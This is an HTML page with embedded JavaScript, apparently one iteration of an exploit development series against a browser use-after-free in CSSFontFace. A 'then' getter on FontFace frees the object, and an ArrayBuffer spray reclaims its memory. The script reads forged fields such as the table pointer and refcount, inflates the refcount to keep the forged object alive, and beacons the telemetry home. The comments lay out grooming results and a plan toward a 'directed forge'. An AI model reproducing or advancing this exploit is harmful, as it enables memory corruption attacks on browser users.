<!--
  p671: rc-inflate — p669-clamp EXACT base (benign seed float @+0x44,
  keepspray via __sprayAlive, OBS cross-round telemetry, opCount clamp kept
  harmless, batch-only beacons, DUMP1/DUMP2, ROUNDS=8, all fields) with ONE
  delta and ONE removal:
    REMOVED: the p670 null-table intervention (p670 verdict: nulling +0x58
      made death EARLIER — 9/9 loads died before the R1 beacon vs p669's
      R1+R1LATE alive with death at R2. The dangling table T is DUAL-USE:
      teardown reads on freed-but-intact table memory survive; with table=0
      an earlier null-deref path kills. Never touch +0x58 again.)
    ADDED: RCINF — in each LATE pass, after OBS (read first), if rc < 0x40000000
      write +0x00 (u32) = 0x7FFFFFF0 (and +0x04 = 0) on every tracked hit
      lane (R0 + later). Emit 'RCINF r<N> rcwas=<v>'.

  HYPOTHESIS (destructor killer, now blocked at the trigger): p668/669
  showed the R2 killer only READS the forged object and never writes
  (+0x58/+0x68/+0x00 written once at R0 reclaim-setup). Rank-D analysis
  (P670_NOTES): ~CSSFontFace -> ~HashTable(m_table=T dangling) ->
  deallocateTable reads T[-1] metadata, walks buckets, free(T-16) — lethal.
  The ONLY destruction trigger of CSSFontFace is refcount reaching 0
  (RefCounted, CSSFontFace.h:60; deref() deletes only when m_refCount-1==0,
  RefCounted.h:129-144 + :187-192; weak pointers never destroy). Inflating
  rc to 0x7FFFFFF0 => every engine-side deref lands on huge-1 => delete
  NEVER fires => ~HashTable never runs => no double-free. The table stays
  dangling-but-intact (the dual-use good side p670 proved we must keep).
  Cost: memory leak of our lane (fine — lanes are kept alive anyway).
  NDEBUG: CHECK_REF_COUNTED_LIFECYCLE=0 outside ASSERT/SECURITY_ASSERTIONS
  (RefCounted.h:30-35) => no refCount asserts fire.

  ADVERSARIAL CAVEAT (encoded in decision tree): rc-inflate blocks the
  DESTRUCTOR killer only. If teardown also READS the forged face (families()
  switchOn-deref of a null variant +0x08, or a stale m_clients lookup), the
  R2/R3 death may persist via a read-path killer — p670's pre-R1 death with
  table=0 proves SOME engine read touches the clients set/table region;
  with T intact those reads survive (p668/669 evidence), so the destructor
  remains the prime suspect for the R2 death.

  Natural experiment baked in: OBS reads rc every round — if the engine
  derefs our inflated rc, OBS shows 0x7FFFFFF0-N (count of engine derefs);
  if rc stays frozen, no deref ever happens (deletion is scheduled by
  something else — outcome (b)).

  Decision tree:
    (a) ALIVE end-r8-rcinf ...... DESTRUCTOR KILLER NEUTRALIZED + STABLE
        FORGE => full multi-round telemetry unlocked (groom-distance x8 in
        one WebProcess, then directed forge).
    (b) death at R2 again ....... destructor runs via a path ignoring
        refcount (direct delete / ownership chain) OR a read-path killer
        (variant deref) — check OBS rc frozen vs decremented, then pivot:
        +0x08 valid-pointer forge (needs VA — groom) or R2 substep beacons.
    (c) death pre-R1 (p670 phenotype) => the rc write itself broke a reader
        (something parses rc during teardown iteration) — OBS/dump would
        show it; revert to p669 exact and re-baseline.

  Beacon: P671-.  CRASH_CLASS: MEDIUM.
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p671</title></head>
<body>p671: rc-inflate (size-seed, r8)
<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
<script>
(function() {
'use strict';
var L = document.getElementById('log');
var bQ = [];
function emit(tag, msg) {
  var s = tag + (msg ? ' ' + msg : '');
  L.textContent += s + '\n';
  bQ.push(s);
}
function flush() {
  while (bQ.length) {
    var b = bQ.splice(0, 2).join('|');
    try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P671-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
  }
}
window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

emit('START', 'rcinflate r8');
flush();

var ROUNDS = 8;
var round = 0;
var results = [];
var gfired = -1;

var sty = null, ff = null;
var armed = false;
var spray = [];
window.__sprayAlive = [];
var snap1 = null;

var round0Lane = null;
var round0T = '';
var hitLanes = [];

function seedLane(dv, i) {
  dv.setFloat32(0x44, 100 + round + i * 0.001, true);
}

Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (!armed) return undefined;
    armed = false;
    gfired = round;
    try { sty.remove(); } catch(e) {}
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;
    spray = window.__sprayAlive[round] = [];
    for (var i = 0; i < 24; i++) {
      var ab = new ArrayBuffer(192);
      var dv = new DataView(ab);
      seedLane(dv, i);
      spray.push(dv);
    }
    return undefined;
  },
  set: function() {}
});

function dumpLane(dv) {
  var out = [];
  for (var off = 0; off <= 0xB8; off += 8) {
    var lo = dv.getUint32(off, true), hi = dv.getUint32(off + 4, true);
    if (lo !== 0 || hi !== 0) out.push(off.toString(16) + ':' + hex32(hi) + hex32(lo));
  }
  return out.join(',');
}

function scanHit() {
  for (var i = 0; i < spray.length; i++) {
    if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) return i;
  }
  return -1;
}

function obsR0Lane() {
  if (!round0Lane) return;
  try {
    var tNow = hex32(round0Lane.getUint32(0x5C, true)) + hex32(round0Lane.getUint32(0x58, true));
    emit('OBS r' + round, 'opc=' + round0Lane.getUint32(0x60, true) +
         ' rc=' + round0Lane.getUint32(0x00, true) +
         ' st=' + round0Lane.getUint8(0x82) +
         ' Tsame=' + (tNow === round0T ? 'y' : 'n'));
  } catch(e) { emit('OBS r' + round, 'ERR ' + String(e).slice(0,60)); }
}

/* RC-INF: never let refcount reach 0 => ~CSSFontFace never runs */
function rcInflate() {
  for (var k = 0; k < hitLanes.length; k++) {
    try {
      var rc = hitLanes[k].dv.getUint32(0x00, true);
      if (rc < 0x40000000) {
        emit('RCINF r' + round, 'lane=' + hitLanes[k].tag + ' rcwas=' + rc);
        hitLanes[k].dv.setUint32(0x00, 0x7FFFFFF0, true);
        hitLanes[k].dv.setUint32(0x04, 0, true);
      }
    } catch(e) { emit('RCINF r' + round, 'ERR lane=' + hitLanes[k].tag); }
  }
}

/* opCount clamp kept from p669 (harmless; p669 showed opc never moves) */
function clampLanes() {
  for (var k = 0; k < hitLanes.length; k++) {
    try {
      var v = hitLanes[k].dv.getUint32(0x60, true);
      if (v !== 0) {
        hitLanes[k].dv.setUint32(0x60, 0, true);
        emit('CLAMP r' + round, 'lane=' + hitLanes[k].tag + ' opc-was=' + v);
      }
    } catch(e) {}
  }
}

function trackHit(hit) {
  var dv = spray[hit];
  if (round === 0) round0Lane = dv;
  hitLanes.push({ tag: 'r' + round, dv: dv });
}

function beginRound() {
  sty = document.createElement('style');
  sty.textContent = "@font-face { font-family: s" + round + "; src: local(Arial); unicode-range: U+0042; }";
  document.head.appendChild(sty);
  ff = new FontFace('f' + round, 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(ff);
  void ff.loaded;
  window.__facesAlive = window.__facesAlive || [];
  window.__facesAlive.push(ff);
  armed = true;
  document.fonts.load('1em f' + round + ', s' + round, 'AB');
  setTimeout(analyzeEarly, 150);
  setTimeout(analyzeLate, 3500);
}

function analyzeEarly() {
  try {
    obsR0Lane();
    var hit = scanHit();
    if (hit < 0) {
      emit('R' + round, 'MISS gf=' + gfired);
      results.push({ r: round, lane: -1, t: '-', w: '-' });
    } else {
      var dv = spray[hit];
      snap1 = dumpLane(dv);
      var tLo = dv.getUint32(0x58, true), tHi = dv.getUint32(0x5C, true);
      var wLo = dv.getUint32(0x68, true), wHi = dv.getUint32(0x6C, true);
      var dirtyNear = 0;
      for (var j = Math.max(0, hit - 3); j <= Math.min(spray.length - 1, hit + 3); j++) {
        if (spray[j].getUint32(0x58, true) !== 0 || spray[j].getUint32(0x5C, true) !== 0) dirtyNear++;
      }
      results.push({ r: round, lane: hit, t: hex32(tHi) + hex32(tLo), w: hex32(wHi) + hex32(wLo) });
      if (round === 0) round0T = hex32(tHi) + hex32(tLo);
      trackHit(hit);
      emit('R' + round, 'hit=' + hit + ' T=' + hex32(tHi) + hex32(tLo) +
           ' W=' + hex32(wHi) + hex32(wLo) + ' rc=' + dv.getUint32(0x00, true) +
           ' opc=' + dv.getUint32(0x60, true) + ' st82=' + dv.getUint8(0x82) +
           ' gf=' + gfired + ' dirtyNear=' + dirtyNear +
           ' seed=' + dv.getFloat32(0x44, true).toFixed(3));
      emit('R' + round + 'DUMP1', snap1.slice(0, 700));
    }
    flush();
  } catch(e) { emit('R' + round + '-FATAL', String(e).slice(0,150)); flush(); }
}

function analyzeLate() {
  try {
    obsR0Lane();                      /* read first ... */
    var hit = scanHit();
    if (hit >= 0 && spray.length) {
      var dv = spray[hit];
      var snap2s = dumpLane(dv);
      emit('R' + round + 'LATE', 'alive st82=' + dv.getUint8(0x82) +
           ' rc=' + dv.getUint32(0x00, true) +
           ' changed=' + (snap1 !== snap2s ? 'YES' : 'no'));
      if (snap1 !== snap2s) emit('R' + round + 'DUMP2', snap2s.slice(0, 700));
    } else {
      emit('R' + round + 'LATE', 'alive (miss-round)');
    }
    rcInflate();                       /* ... then inflate rc (outside windows) */
    clampLanes();                      /* harmless */
    flush();
    round++;
    if (round < ROUNDS) {
      gfired = -1;
      setTimeout(beginRound, 250);
    } else {
      var ts = {}, lanes = [];
      for (var k = 0; k < results.length; k++) {
        ts[results[k].t] = (ts[results[k].t] || 0) + 1;
        lanes.push(results[k].lane);
      }
      var keys = Object.keys(ts);
      emit('SUMMARY', 'rcinf rounds=' + results.length + ' kept=' + window.__sprayAlive.length +
           ' distinctT=' + keys.length + ' lanes=[' + lanes.join(',') + ']');
      for (var q = 0; q < keys.length; q++) emit('TVAL', keys[q] + ' x' + ts[keys[q]]);
      emit('ALIVE', 'end-r8-rcinf');
      flush();
    }
  } catch(e) { emit('R' + round + 'LATE-FATAL', String(e).slice(0,150)); flush(); }
}

setTimeout(beginRound, 50);

})();
</script>
</body></html>
